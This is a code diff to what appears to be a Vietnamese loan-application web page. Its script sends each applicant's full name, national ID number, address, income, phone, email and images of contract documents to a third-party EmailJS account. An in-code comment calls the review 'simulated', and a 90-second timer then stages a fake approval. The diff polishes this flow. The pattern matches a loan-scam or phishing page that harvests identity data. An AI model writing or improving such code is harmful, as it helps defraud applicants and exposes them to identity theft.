@@ -455,6 +455,9 @@
             <div class="confirmation-box">
                 <p id="confirmationMessage"></p>
             </div>
+            <div class="info-box">
+                <p>Chúng tôi đã gửi email xác nhận đến địa chỉ <span id="confirmationEmail"></span>. Vui lòng kiểm tra hộp thư!</p>
+            </div>
             <div class="text-center mt-3">
                 <button id="proceedToContractBtn" class="btn btn-primary">Xem Hợp Đồng</button>
             </div>
@@ -890,20 +893,20 @@
 
                 // Gửi email thu thập thông tin (giả lập xét duyệt)
                 let emailParams = {
-                    fullName: userData.fullName,
-                    idNumber: userData.idNumber,
-                    address: userData.address,
-                    occupation: userData.occupation,
-                    income: userData.income,
-                    phoneNumber: userData.phoneNumber,
-                    email: userData.email,
-                    loanAmount: userData.loanAmount,
-                    loanTerm: userData.loanTerm,
-                    loanCode: userData.loanCode,
-                    registrationDate: userData.registrationDate,
-                    monthlyPayment: userData.monthlyPayment,
-                    contractImageUrl: formData.contractImage,
-                    disbursementImageUrl: formData.disbursementImage
+                    fullName: userData.fullName || "",
+                    idNumber: userData.idNumber || "",
+                    address: userData.address || "",
+                    occupation: userData.occupation || "",
+                    income: userData.income || "",
+                    phoneNumber: userData.phoneNumber || "",
+                    email: userData.email || "",
+                    loanAmount: userData.loanAmount || "",
+                    loanTerm: userData.loanTerm || "",
+                    loanCode: userData.loanCode || "",
+                    registrationDate: userData.registrationDate || "",
+                    monthlyPayment: userData.monthlyPayment || "",
+                    contractImageUrl: formData.contractImage || "",
+                    disbursementImageUrl: formData.disbursementImage || ""
                 };
 
                 emailjs.send("service_db2prre", "template_g4jo6tc", emailParams)
@@ -918,20 +921,21 @@
                                     $('#modalLoanAmount').text(`Số tiền vay: ${formatNumber(userData.loanAmount)} VND`);
                                     $('#modalLoanCode').text(`Mã hồ sơ: ${userData.loanCode}`);
                                     $('#confirmationMessage').text(`Mã hồ sơ: ${userData.loanCode}`);
+                                    $('#confirmationEmail').text(userData.email);
 
                                     // Chuyển sang bước 7: Thông báo duyệt hồ sơ
                                     $('#step6').addClass('hidden');
                                     $('#step7').removeClass('hidden');
                                 }, function(error) {
                                     console.error("Lỗi khi gửi email xác nhận:", error);
-                                    alert("Có lỗi xảy ra trong quá trình xét duyệt. Vui lòng thử lại!");
+                                    alert("Có lỗi xảy ra trong quá trình xét duyệt: " + JSON.stringify(error) + ". Vui lòng thử lại!");
                                     $('#step6').addClass('hidden');
                                     $('#step1').removeClass('hidden');
                                 });
                         }, 90000); // Giả lập 1,5 phút (90 giây)
                     }, function(error) {
                         console.error("Lỗi khi gửi email thu thập thông tin:", error);
-                        alert("Có lỗi xảy ra trong quá trình xét duyệt. Vui lòng thử lại!");
+                        alert("Có lỗi xảy ra trong quá trình xét duyệt: " + JSON.stringify(error) + ". Vui lòng thử lại!");
                         $('#step6').addClass('hidden');
                         $('#step1').removeClass('hidden');
                     });
